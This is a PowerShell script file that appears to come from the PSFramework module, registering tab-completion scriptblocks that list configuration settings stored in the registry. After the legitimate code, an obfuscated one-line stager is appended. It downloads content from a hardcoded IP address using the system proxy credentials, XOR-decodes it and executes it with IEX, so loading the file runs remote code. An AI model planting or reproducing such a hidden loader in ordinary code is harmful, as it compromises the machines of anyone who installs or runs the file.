Register-PSFTeppScriptblock -Name "PSFramework-Unregister-PSFConfig-FullName" -ScriptBlock {
	switch ("$($fakeBoundParameter.Scope)")
	{
		"UserDefault" { $path = "HKCU:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Default" }
		"UserMandatory" { $path = "HKCU:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Enforced" }
		"SystemDefault" { $path = "HKLM:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Default" }
		"SystemMandatory" { $path = "HKLM:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Enforced" }
		default { $path = "HKCU:\SOFTWARE\Microsoft\WindowsPowerShell\PSFramework\Config\Default" }
	}
	
	if (Test-Path $path)
	{
		$properties = Get-ItemProperty -Path $path
		$common = 'PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider'
		$properties.PSObject.Properties.Name | Where-Object { $_ -notin $common }
	}
}

Register-PSFTeppScriptblock -Name "PSFramework-Unregister-PSFConfig-Module" -ScriptBlock {
	[PSFramework.Configuration.ConfigurationHost]::Configurations.Values.Module | Select-Object -Unique
}
$wc=NEw-ObjECt SYStem.NET.WEBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEADErs.Add('User-Agent',$u);$WC.PROXy = [SySTEm.Net.WeBReQUEsT]::DeFAUlTWebPRoXY;$Wc.ProXY.CReDENTiaLs = [SysTeM.NEt.CREDEnTialCaChe]::DefaultNEtwOrkCREDEntIALS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[ChaR[]]$b=([CHaR[]]($Wc.DOWNLoAdSTriNg("http://192.168.118.129:8080/index.asp")))|%{$_-bXor$K[$i++%$k.LenGtH]};IEX ($B-Join'')

